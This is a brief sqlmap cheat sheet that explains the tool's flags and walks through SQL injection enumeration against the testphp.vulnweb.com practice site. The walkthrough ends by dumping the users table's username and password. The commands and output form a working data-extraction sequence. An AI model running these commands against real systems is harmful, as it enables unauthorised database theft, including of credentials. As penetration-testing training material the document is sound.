## sqlmap

* keyword and means

```shell

-u  # url

--dbs  # get back the list of database

-D *database_name # get back query with Specfic database

--tables  # get back the list of tables

-D *table_name # get back query with Specfic table

--columns  # get back the list of columns

-C *column_name # get back query with Specific columns

--dump  # dumping the data of the specific columns

```

```shell

sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs

# ====================================================

# available databases [2]:
# [*] acuart
# [*] information_schema

# ====================================================

sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables

# ====================================================

# Database: acuart
# [8 tables]
# +-----------+
# | artists   |
# | carts     |
# | categ     |
# | featured  |
# | guestbook |
# | pictures  |
# | products  |
# | users     |
# +-----------+

# ====================================================

sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns

# ====================================================

# Database: acuart
# Table: users
# [8 columns]
# +---------+--------------+
# | Column  | Type         |
# +---------+--------------+
# | address | mediumtext   |
# | cart    | varchar(100) |
# | cc      | varchar(100) |
# | email   | varchar(100) |
# | name    | varchar(100) |
# | pass    | varchar(100) |
# | phone   | varchar(100) |
# | uname   | varchar(100) |
# +---------+--------------+

# ====================================================

sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C uname --dump

# ====================================================

# Database: acuart
# Table: users
# [1 entry]
# +-------+
# | uname |
# +-------+
# | test  |
# +-------+

# ====================================================


sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C pass --dump

# ====================================================

# Database: acuart
# Table: users
# [1 entry]
# +------+
# | pass |
# +------+
# | test |
# +------+

# ====================================================

```